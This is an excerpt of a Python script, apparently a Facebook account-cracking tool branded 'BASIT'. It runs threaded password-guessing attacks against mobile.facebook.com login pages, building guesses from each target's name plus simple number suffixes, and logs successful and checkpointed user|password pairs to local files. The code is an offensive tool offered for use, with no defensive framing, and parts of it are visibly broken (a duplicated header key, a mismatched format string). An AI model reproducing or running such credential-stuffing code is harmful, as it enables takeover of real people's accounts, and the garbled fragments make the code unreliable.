...
from concurrent.futures import ThreadPoolExecutor as sarfrazBASIT
...
header_grup = {"user-agent": "[FBAN/FB4A;FBAV/401.0.0.24.77;FBBV/444698397;FBDM/{density=2.0,width=720,height=1344};FBLC/pl_PL;FBRV/446873990;FBCR/;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 3.1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"}
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK:\x1b[1;97m %s  \x1b[1;97mBASIT_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mBASIT_CP.txt'  % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back BASIT Menu ")
	    sarfraz()
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[BASIT] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
    ...
    'referer': 'https://mobile.facebook.com/home.php?tbua=1',
    ...
    'user-agent': 'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
                ...
                r = session.get('https://mobile.facebook.com/?_rdc=1&_rdr&tbua=1', cookies=cookies, headers=headers)
                das = {
                ...
                po = session.post('https://mobile.facebook.com/?_rdc=1&_rdr&tbua=1', cookies=cookies, headers=headers)
                if 'c_user' in session.cookies.get_dict():
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    print(f"\r{H} [BASIT-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('BASIT_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [BASIT-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('BASIT_CP.txt' , 'a').write('%s\n' % wrt)
                        break
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print(47*"-")
            with sarfrazBASIT(max_workers=30) as BASITworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                        BASITworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('2', '02'):
